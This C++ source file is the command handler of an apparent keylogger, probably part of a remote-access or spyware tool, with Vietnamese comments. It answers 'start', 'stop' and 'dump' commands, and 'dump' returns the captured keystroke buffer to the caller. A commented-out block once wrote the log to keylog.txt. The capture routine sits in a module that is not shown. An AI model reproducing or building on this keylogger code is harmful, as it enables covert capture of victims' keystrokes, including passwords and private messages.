// src/Commands/KeyCommand.cpp

#include "../../include/Commands/KeyCommand.h"
#include "../../include/Modules/KeyController.h"
// Bỏ include <fstream> vì không dùng file nữa
#include <sstream>

std::string KeyCommand::execute(const std::string& args) {
    if (args == "start") {
        KeyControllerModule::start();
        return "SUCCESS: Key capture started."; // Sửa lại thông báo để nhất quán
    }

    if (args == "stop") {
        KeyControllerModule::stop();
        return "SUCCESS: Key capture stopped.";
    }

    if (args == "dump") {
        std::string keylog_data = KeyControllerModule::getBuffer();
        
        // --- LOGIC GHI FILE ĐÃ BỊ LOẠI BỎ ---
        /* std::ofstream f("keylog.txt", std::ios::app);
        if (f.is_open()) {
            f << data;
            f.close();
        }
        */
        
        if (!keylog_data.empty()) {
            return "SUCCESS: Key log content:\n" + keylog_data;
        } else {
            return "SUCCESS: Key log buffer is currently empty.";
        }
    }

    return "ERROR: Unknown key command: " + args;
}